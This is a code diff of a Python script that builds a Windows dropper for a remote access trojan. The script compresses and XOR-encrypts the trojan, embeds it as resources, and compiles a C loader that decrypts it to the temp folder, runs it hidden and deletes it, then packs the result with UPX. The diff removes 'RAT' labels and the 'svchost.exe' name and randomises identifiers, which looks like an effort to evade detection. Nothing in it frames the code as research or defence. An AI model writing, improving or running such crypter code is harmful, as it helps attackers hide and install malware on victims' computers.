@@ -6,11 +6,11 @@ import string
 import zlib
 
 def generate_random_name():
-    return ''.join(random.choices(string.ascii_lowercase, k=8))
+    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
 
 def build_single_exe_with_dll(exe_path):
     print("=" * 60)
-    print("SINGLE EXE WITH EMBEDDED DLL (BINARY)")
+    print("BUILDING EXECUTABLE")
     print("=" * 60)
     
     if not os.path.exists(exe_path):
@@ -19,13 +19,13 @@ def build_single_exe_with_dll(exe_path):
     
     output_dir = os.path.dirname(exe_path)
     
-    print("Reading RAT EXE...")
+    print("Reading source...")
     with open(exe_path, 'rb') as f:
         exe_data = f.read()
     
-    print(f"RAT size: {len(exe_data) / (1024*1024):.1f} MB")
+    print(f"Source size: {len(exe_data) / (1024*1024):.1f} MB")
     
-    print("Compressing...")
+    print("Processing...")
     compressed = zlib.compress(exe_data, level=9)
     
     print("Encrypting...")
@@ -34,31 +34,30 @@ def build_single_exe_with_dll(exe_path):
     for i, byte in enumerate(compressed):
         encrypted.append(byte ^ key[i % len(key)])
     
-    # Save as binary files
-    rat_bin = os.path.join(output_dir, 'rat.bin')
-    with open(rat_bin, 'wb') as f:
+    name1 = generate_random_name()
+    name2 = generate_random_name()
+    
+    data_bin = os.path.join(output_dir, f'{name1}.bin')
+    with open(data_bin, 'wb') as f:
         f.write(encrypted)
     
-    key_bin = os.path.join(output_dir, 'key.bin')
+    key_bin = os.path.join(output_dir, f'{name2}.bin')
     with open(key_bin, 'wb') as f:
         f.write(key)
     
     print("Creating resource file...")
     
-    # Resource file
-    rc_content = '''
+    rc_content = f'''
 #include <windows.h>
-IDR_RAT_DATA RCDATA "rat.bin"
-IDR_RAT_KEY RCDATA "key.bin"
+IDR_1 RCDATA "{name1}.bin"
+IDR_2 RCDATA "{name2}.bin"
 '''
     
     rc_file = os.path.join(output_dir, 'resource.rc')
     with open(rc_file, 'w', encoding='utf-8') as f:
         f.write(rc_content)
     
-    dll_name = f"system_{generate_random_name()}.dll"
-    
-    print("Creating EXE with embedded DLL...")
+    print("Creating executable...")
     
     loader_code = f'''
 #include <windows.h>
@@ -68,81 +67,84 @@ IDR_RAT_KEY RCDATA "key.bin"
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 #pragma comment(linker, "/ENTRY:mainCRTStartup")
 
-#define IDR_RAT_DATA 101
-#define IDR_RAT_KEY 102
+#define IDR_1 101
+#define IDR_2 102
 
-void xor_decrypt(unsigned char* data, int len, unsigned char* key, int key_len) {{
-    for(int i = 0; i < len; i++) {{
-        data[i] ^= key[i % key_len];
+void proc1(unsigned char* d, int l, unsigned char* k, int kl) {{
+    for(int i = 0; i < l; i++) {{
+        d[i] ^= k[i % kl];
     }}
 }}
 
-void run_rat() {{
-    HMODULE hModule = GetModuleHandleA(NULL);
+void proc2() {{
+    HMODULE h = GetModuleHandleA(NULL);
     
-    // Get encrypted data
-    HRSRC hResData = FindResourceA(hModule, MAKEINTRESOURCE(IDR_RAT_DATA), "RCDATA");
-    if (!hResData) return;
+    HRSRC r1 = FindResourceA(h, MAKEINTRESOURCE(IDR_1), "RCDATA");
+    if (!r1) return;
     
-    HGLOBAL hData = LoadResource(hModule, hResData);
-    if (!hData) return;
+    HGLOBAL g1 = LoadResource(h, r1);
+    if (!g1) return;
     
-    DWORD data_size = SizeofResource(hModule, hResData);
-    unsigned char* enc_data = (unsigned char*)LockResource(hData);
+    DWORD s1 = SizeofResource(h, r1);
+    unsigned char* d1 = (unsigned char*)LockResource(g1);
     
-    // Get key
-    HRSRC hResKey = FindResourceA(hModule, MAKEINTRESOURCE(IDR_RAT_KEY), "RCDATA");
-    if (!hResKey) return;
+    HRSRC r2 = FindResourceA(h, MAKEINTRESOURCE(IDR_2), "RCDATA");
+    if (!r2) return;
     
-    HGLOBAL hKey = LoadResource(hModule, hResKey);
-    if (!hKey) return;
+    HGLOBAL g2 = LoadResource(h, r2);
+    if (!g2) return;
     
-    DWORD key_size = SizeofResource(hModule, hResKey);
-    unsigned char* key_data = (unsigned char*)LockResource(hKey);
+    DWORD s2 = SizeofResource(h, r2);
+    unsigned char* d2 = (unsigned char*)LockResource(g2);
     
-    // Decrypt
-    unsigned char* decrypted = (unsigned char*)malloc(data_size);
-    if (!decrypted) return;
-    memcpy(decrypted, enc_data, data_size);
-    xor_decrypt(decrypted, data_size, key_data, key_size);
+    unsigned char* out = (unsigned char*)malloc(s1);
+    if (!out) return;
+    memcpy(out, d1, s1);
+    proc1(out, s1, d2, s2);
     
-    // Temp file
-    char temp[MAX_PATH];
-    GetTempPathA(MAX_PATH, temp);
-    strcat(temp, "svchost.exe");
+    char tmp[MAX_PATH];
+    char fn[13];
+    GetTempPathA(MAX_PATH, tmp);
+    const char* c = "abcdefghijklmnopqrstuvwxyz0123456789";
+    for(int i = 0; i < 12; i++) {{
+        fn[i] = c[rand() % 36];
+    }}
+    fn[12] = '\\0';
+    strcat(tmp, fn);
+    strcat(tmp, ".exe");
     
-    HANDLE h = CreateFileA(temp, GENERIC_WRITE, 0, NULL,
+    HANDLE f = CreateFileA(tmp, GENERIC_WRITE, 0, NULL,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (h != INVALID_HANDLE_VALUE) {{
+    if (f != INVALID_HANDLE_VALUE) {{
         DWORD w;
-        WriteFile(h, decrypted, data_size, &w, NULL);
-        CloseHandle(h);
+        WriteFile(f, out, s1, &w, NULL);
+        CloseHandle(f);
         
         STARTUPINFOA si = {{sizeof(si)}};
         PROCESS_INFORMATION pi;
         si.dwFlags = STARTF_USESHOWWINDOW;
         si.wShowWindow = SW_HIDE;
         
-        CreateProcessA(temp, NULL, NULL, NULL, FALSE,
+        CreateProcessA(tmp, NULL, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
         
         CloseHandle(pi.hThread);
         CloseHandle(pi.hProcess);
         Sleep(9000);
-        DeleteFileA(temp);
+        DeleteFileA(tmp);
     }}
-    free(decrypted);
+    free(out);
 }}
 
-BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID) {{
-    if (reason == DLL_PROCESS_ATTACH) {{
-        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)run_rat, NULL, 0, NULL);
+BOOL APIENTRY entry(HMODULE h, DWORD r, LPVOID) {{
+    if (r == DLL_PROCESS_ATTACH) {{
+        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)proc2, NULL, 0, NULL);
     }}
     return TRUE;
 }}
 
 int main() {{
-    DllMain(GetModuleHandleA(NULL), DLL_PROCESS_ATTACH, NULL);
+    entry(GetModuleHandleA(NULL), DLL_PROCESS_ATTACH, NULL);
     while(1) Sleep(1000);
     return 0;
 }}
@@ -152,14 +154,13 @@ int main() {{
     with open(loader_src, 'w', encoding='utf-8') as f:
         f.write(loader_code)
     
-    print("Compiling with resources...")
-    loader_exe = os.path.join(output_dir, 'svchost_final.exe')
+    print("Compiling...")
+    exe_name = f"{generate_random_name()}.exe"
+    loader_exe = os.path.join(output_dir, exe_name)
     
-    # Compile resource
     res_obj = os.path.join(output_dir, 'resource.o')
     subprocess.run(['windres', '-i', rc_file, '-o', res_obj], capture_output=True)
     
-    # Compile EXE
     cmd = [
         'gcc',
         loader_src,
@@ -178,7 +179,7 @@ int main() {{
         print(f"Compilation failed: {e}")
         return None
     
-    print("Compressing with UPX...")
+    print("Compressing...")
     try:
         subprocess.run(['upx', '--best', loader_exe], capture_output=True)
     except:
@@ -196,7 +197,7 @@ int main() {{
     try:
         os.remove(rc_file)
         os.remove(res_obj)
-        os.remove(rat_bin)
+        os.remove(data_bin)
         os.remove(key_bin)
         os.remove(loader_src)
     except:
@@ -205,7 +206,7 @@ int main() {{
     return loader_exe
 
 if __name__ == "__main__":
-    exe_path = "dist/rat_temp.exe"
+    exe_path = "dist/temp.exe"
     
     if len(sys.argv) > 1:
         exe_path = sys.argv[1]
